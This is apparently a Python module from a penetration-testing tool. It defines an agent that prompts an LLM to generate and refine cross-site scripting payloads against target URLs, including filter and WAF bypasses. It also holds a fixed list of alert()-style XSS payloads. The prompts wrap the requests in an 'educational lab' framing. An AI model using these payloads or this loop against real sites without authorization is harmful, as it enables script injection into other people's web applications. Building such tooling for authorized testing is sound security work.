#!/usr/bin/env python3
"""
Dynamic Payload Generation Agent
Enhanced from original dynamic_xss_agent.py with support for multiple XSS types
"""

import json
import logging
import os
from datetime import datetime
from typing import Optional, List
from urllib.parse import urlparse, parse_qs

from agno.agent import Agent
from core.models import (
    PayloadAttempt, VulnerabilityContext, NucleiResult, 
    VerificationResult, XSSType, DetectionMethod
)
from core.utils import clean_json_response, get_timestamp

try:
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / "src" / "xss_agent"))
    from llm_client import get_llm_client
    HAS_LLM_CLIENT = True
except ImportError as e:
    HAS_LLM_CLIENT = False
    logging.warning(f"LLM client not available. LLM functionality will be limited: {e}")


class DynamicPayloadAgent(Agent):
    """Agent responsible for dynamic XSS payload generation and improvement using LLM"""
    
    def __init__(self, config: Optional[dict] = None):
        super().__init__()
        self.config = config or {}
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # LLM configuration
        self.llm_config = {
            'model': self.config.get('llm_model', 'llama3.3-70b'),
            'temperature': self.config.get('llm_temperature', 0.7),
            'max_tokens': self.config.get('llm_max_tokens', 1000),
            'timeout': self.config.get('llm_timeout', 30)
        }
        
        # Initialize LLM client
        self.llm_client = None
        if HAS_LLM_CLIENT:
            try:
                self.llm_client = get_llm_client()
            except Exception as e:
                self.logger.error(f"Failed to initialize LLM client: {e}")

        if not self.llm_client:
            self.logger.warning("No LLM client available. Falling back to static payloads.")
            
        # Fallback payloads for different XSS types
        self.fallback_payloads = {
            XSSType.REFLECTED: [
                '<script>alert("Reflected-XSS")</script>',
                '<img src=x onerror=alert("Reflected-XSS")>',
                '<svg onload=alert("Reflected-XSS")>',
                '"><script>alert("Reflected-XSS")</script>',
                'javascript:alert("Reflected-XSS")'
            ],
            XSSType.STORED: [
                '<script>alert("Stored-XSS")</script>',
                '<img src=x onerror=alert("Stored-XSS")>',
                '<svg onload=alert("Stored-XSS")>',
                '<iframe src=javascript:alert("Stored-XSS")>',
                '<body onload=alert("Stored-XSS")>'
            ],
            XSSType.DOM_BASED: [
                '<img src=x onerror=alert("DOM-XSS")>',
                '<svg onload=alert("DOM-XSS")>',
                'javascript:alert("DOM-XSS")',
                '"><script>alert("DOM-XSS")</script>'
            ]
        }
        
    async def generate_initial_payload(self, vulnerability_context: VulnerabilityContext) -> PayloadAttempt:
        """Generate initial XSS payload based on context"""
        
        if self.llm_client:
            return await self._generate_llm_payload(vulnerability_context)
        else:
            return self._generate_fallback_payload(vulnerability_context)
    
    async def improve_payload(self, vulnerability_context: VulnerabilityContext, 
                             playwright_result: VerificationResult) -> PayloadAttempt:
        """Improve payload based on previous attempt results"""
        
        if self.llm_client:
            return await self._improve_llm_payload(vulnerability_context, playwright_result)
        else:
            return self._generate_fallback_payload(vulnerability_context)
    
    async def _generate_llm_payload(self, vulnerability_context: VulnerabilityContext) -> PayloadAttempt:
        """Generate payload using LLM"""
        
        xss_type = vulnerability_context.xss_type
        detection_method = vulnerability_context.detection_method
        
        # Build context-specific prompt
        if vulnerability_context.nuclei_result:
            finding = vulnerability_context.nuclei_result
            nuclei_payload = self._extract_nuclei_payload(finding)
            
            prompt = f"""
            You are a security testing expert analyzing XSS vulnerabilities for educational purposes in a controlled lab environment.

            VULNERABILITY ANALYSIS:
            - Target URL: {finding.matched_url}
            - XSS Type: {xss_type.value}
            - Detection Method: {detection_method.value}
            - Vulnerability Type: {finding.template_name}
            - Description: {finding.description}
            - Nuclei Working Payload: {nuclei_payload}
            - Severity: {finding.severity}

            TASK: Generate an initial {xss_type.value} XSS payload for testing this vulnerability.

            REQUIREMENTS:
            1. Analyze the context to understand the injection point
            2. Create a payload optimized for {xss_type.value} XSS
            3. Consider encoding, filters, and WAF bypass techniques
            4. Provide clear reasoning for payload design
            5. Respond in JSON format only

            RESPONSE FORMAT:
            {{
                "attempt": 1,
                "payload": "<your_generated_payload>",
                "reasoning": "Detailed explanation of why this payload should work for {xss_type.value} XSS",
                "result": "pending",
                "next_action": "Test this payload in the browser"
            }}
            """
        else:
            # Generic payload generation for MITM-discovered vulnerabilities
            prompt = f"""
            You are a security testing expert generating XSS payloads for educational testing.

            CONTEXT:
            - XSS Type: {xss_type.value}
            - Detection Method: {detection_method.value}
            - Target: Generic web application testing

            TASK: Generate a {xss_type.value} XSS payload.

            PAYLOAD REQUIREMENTS for {xss_type.value}:
            """ + self._get_xss_type_requirements(xss_type) + f"""

            RESPONSE FORMAT:
            {{
                "attempt": 1,
                "payload": "<your_generated_payload>",
                "reasoning": "Explanation of payload design for {xss_type.value} XSS",
                "result": "pending",
                "next_action": "Test payload"
            }}
            """
        
        return await self._call_llm_for_payload(prompt, 1, vulnerability_context)
    
    async def _improve_llm_payload(self, vulnerability_context: VulnerabilityContext, 
                                  playwright_result: VerificationResult) -> PayloadAttempt:
        """Improve payload using LLM based on failure analysis"""
        
        history = vulnerability_context.attempt_history
        current_attempt = vulnerability_context.current_attempt + 1
        xss_type = vulnerability_context.xss_type
        
        # Build history context
        history_text = "\n".join([
            f"Attempt {h.attempt}: Payload='{h.payload}' | Result={h.result} | Reasoning: {h.reasoning}"
            for h in history
        ])
        
        failure_details = {
            "executed": playwright_result.executed,
            "reflection_found": playwright_result.reflection_found,
            "execution_method": playwright_result.execution_method,
            "error": playwright_result.error,
            "console_logs": len(playwright_result.console_logs or []),
            "alerts_caught": len(playwright_result.alerts_caught or []),
            "response_status": playwright_result.response_status,
            "page_content_sample": playwright_result.page_content[:500] if playwright_result.page_content else "No content captured"
        }
        
        prompt = f"""
        You are a security testing expert improving {xss_type.value} XSS payloads for educational testing.

        VULNERABILITY CONTEXT:
        - XSS Type: {xss_type.value}
        - Target URL: {playwright_result.url}
        
        ATTEMPT HISTORY:
        {history_text}

        LATEST ATTEMPT FAILURE ANALYSIS:
        - Payload Executed: {failure_details['executed']}
        - Payload Reflected: {failure_details['reflection_found']}
        - Execution Method: {failure_details['execution_method']}
        - Console Logs Count: {failure_details['console_logs']}
        - Alerts Caught: {failure_details['alerts_caught']}
        - HTTP Response Status: {failure_details['response_status']}
        - Error: {failure_details['error']}
        - Page Content Sample: {failure_details['page_content_sample']}

        TASK: Generate an improved {xss_type.value} XSS payload that addresses the failure reasons.

        IMPROVEMENT STRATEGIES for {xss_type.value}:
        """ + self._get_improvement_strategies(xss_type) + f"""

        RESPONSE FORMAT:
        {{
            "attempt": {current_attempt},
            "payload": "<improved_payload>",
            "reasoning": "Detailed analysis of why previous attempts failed and how this payload improves for {xss_type.value} XSS",
            "result": "pending",
            "next_action": "Test improved payload"
        }}
        """
        
        return await self._call_llm_for_payload(prompt, current_attempt, vulnerability_context)
    
    async def _call_llm_for_payload(self, prompt: str, attempt_num: int, 
                                   vulnerability_context: VulnerabilityContext) -> PayloadAttempt:
        """Call LLM with prompt and parse response"""
        
        try:
            response = self.llm_client.simple_chat(
                model=self.llm_config['model'],
                message=prompt,
                temperature=self.llm_config['temperature']
            )
            
            # Save debug info
            debug_file = self._create_debug_file(attempt_num, vulnerability_context)
            with open(debug_file, 'w') as f:
                f.write(f"PAYLOAD GENERATION - ATTEMPT {attempt_num}\n\nPROMPT:\n{prompt}\n\nRESPONSE:\n{response}")
            
            # Parse response
            try:
                cleaned_response = clean_json_response(response)
                payload_data = json.loads(cleaned_response)
                
                attempt = PayloadAttempt(
                    attempt=attempt_num,
                    payload=payload_data["payload"],
                    reasoning=payload_data["reasoning"],
                    result="pending",
                    xss_type=vulnerability_context.xss_type,
                    detection_method=vulnerability_context.detection_method,
                    next_action=payload_data.get("next_action", "Test payload"),
                    timestamp=get_timestamp()
                )
                
                self.logger.info(f"Generated {vulnerability_context.xss_type.value} payload (attempt {attempt_num}): {attempt.payload[:50]}...")
                return attempt
                
            except Exception as parse_error:
                self.logger.error(f"Failed to parse LLM response: {parse_error}")
                with open(debug_file, 'a') as f:
                    f.write(f"\n\nPARSE ERROR: {parse_error}")
                
                # Fallback to static payload
                return self._generate_fallback_payload(vulnerability_context, attempt_num)
                
        except Exception as e:
            self.logger.error(f"LLM error in payload generation: {e}")
            return self._generate_fallback_payload(vulnerability_context, attempt_num)
    
    def _generate_fallback_payload(self, vulnerability_context: VulnerabilityContext, 
                                  attempt_num: int = 1) -> PayloadAttempt:
        """Generate fallback payload when LLM is not available"""
        
        xss_type = vulnerability_context.xss_type
        payloads = self.fallback_payloads.get(xss_type, self.fallback_payloads[XSSType.REFLECTED])
        
        # Cycle through payloads based on attempt number
        payload_index = (attempt_num - 1) % len(payloads)
        selected_payload = payloads[payload_index]
        
        attempt = PayloadAttempt(
            attempt=attempt_num,
            payload=selected_payload,
            reasoning=f"Fallback {xss_type.value} payload (attempt {attempt_num}). No LLM available.",
            result="pending",
            xss_type=xss_type,
            detection_method=vulnerability_context.detection_method,
            next_action="Test fallback payload",
            timestamp=get_timestamp()
        )
        
        self.logger.info(f"Generated fallback {xss_type.value} payload: {selected_payload}")
        return attempt
    
    def _extract_nuclei_payload(self, finding: NucleiResult) -> str:
        """Extract the working payload from Nuclei results"""
        if finding.raw_data and 'matched-at' in finding.raw_data:
            matched_url = finding.raw_data['matched-at']
            parsed = urlparse(matched_url)
            params = parse_qs(parsed.query)
            if params:
                return list(params.values())[0][0] if params else ""
        return ""
    
    def _get_xss_type_requirements(self, xss_type: XSSType) -> str:
        """Get specific requirements for each XSS type"""
        
        requirements = {
            XSSType.REFLECTED: """
            - Payload should execute immediately upon page load
            - Consider URL encoding and character filtering
            - Test both GET and POST parameter injection
            - Focus on breaking out of existing HTML contexts
            """,
            XSSType.STORED: """
            - Payload should persist and execute on multiple page views
            - Consider input sanitization and storage encoding
            - Test form submissions and data persistence
            - Focus on payloads that survive database storage
            """,
            XSSType.DOM_BASED: """
            - Payload should manipulate DOM through JavaScript
            - Consider client-side sources like location.hash, location.search
            - Test DOM sinks like innerHTML, document.write, eval
            - Focus on payloads that execute through DOM manipulation
            """
        }
        
        return requirements.get(xss_type, requirements[XSSType.REFLECTED])
    
    def _get_improvement_strategies(self, xss_type: XSSType) -> str:
        """Get improvement strategies for each XSS type"""
        
        strategies = {
            XSSType.REFLECTED: """
            - Try different encoding techniques (URL, HTML, JavaScript)
            - Test alternate event handlers (onerror, onload, onmouseover)
            - Use different HTML tags (img, svg, iframe, script)
            - Try breaking out of different contexts (attribute, script tag)
            """,
            XSSType.STORED: """
            - Test payloads that bypass server-side filtering
            - Use encoding that survives database storage
            - Try different submission methods and content types
            - Consider delayed execution techniques
            """,
            XSSType.DOM_BASED: """
            - Test different DOM sources and manipulation methods
            - Use fragment identifiers and URL parameters
            - Try various DOM sinks and JavaScript execution contexts
            - Consider client-side encoding and escaping bypasses
            """
        }
        
        return strategies.get(xss_type, strategies[XSSType.REFLECTED])
    
    def _create_debug_file(self, attempt_num: int, vulnerability_context: VulnerabilityContext) -> str:
        """Create debug file path"""
        
        xss_type = vulnerability_context.xss_type.value
        detection_method = vulnerability_context.detection_method.value
        timestamp = get_timestamp()
        
        os.makedirs("logs", exist_ok=True)
        return f"logs/{xss_type}_payload_{detection_method}_attempt_{attempt_num}_{timestamp}.txt"
    
    def get_statistics(self) -> dict:
        """Get statistics about payload generation"""
        
        total_fallback_payloads = sum(len(payloads) for payloads in self.fallback_payloads.values())
        
        return {
            'llm_available': self.llm_client is not None,
            'llm_config': self.llm_config,
            'fallback_payloads_count': total_fallback_payloads,
            'supported_xss_types': [xss_type.value for xss_type in self.fallback_payloads.keys()]
        }